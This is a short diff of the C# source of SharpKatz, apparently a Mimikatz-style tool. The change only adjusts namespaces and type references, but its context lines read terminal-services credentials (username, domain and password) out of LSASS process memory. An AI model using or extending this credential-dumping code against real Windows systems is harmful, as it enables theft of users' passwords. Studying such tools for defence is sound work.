@@ -3,11 +3,11 @@ using SharpKatz.Crypto;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using static SharpKatz.Module.Msv1;
-using static SharpKatz.Natives;
+
+using static SharpKatz.Win32.Natives;
 
 namespace SharpKatz.Module
 {
@@ -119,9 +119,9 @@ namespace SharpKatz.Module
                 byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL))));
                 KIWI_TS_PRIMARY_CREDENTIAL pCred = Utility.ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);
 
-                Natives.UNICODE_STRING usUserName = pCred.credentials.UserName;
-                Natives.UNICODE_STRING usDomain = pCred.credentials.Domaine;
-                Natives.UNICODE_STRING usPassword = pCred.credentials.Password;
+                UNICODE_STRING usUserName = pCred.credentials.UserName;
+                UNICODE_STRING usDomain = pCred.credentials.Domaine;
+                UNICODE_STRING usPassword = pCred.credentials.Password;
 
                 string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
                 string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
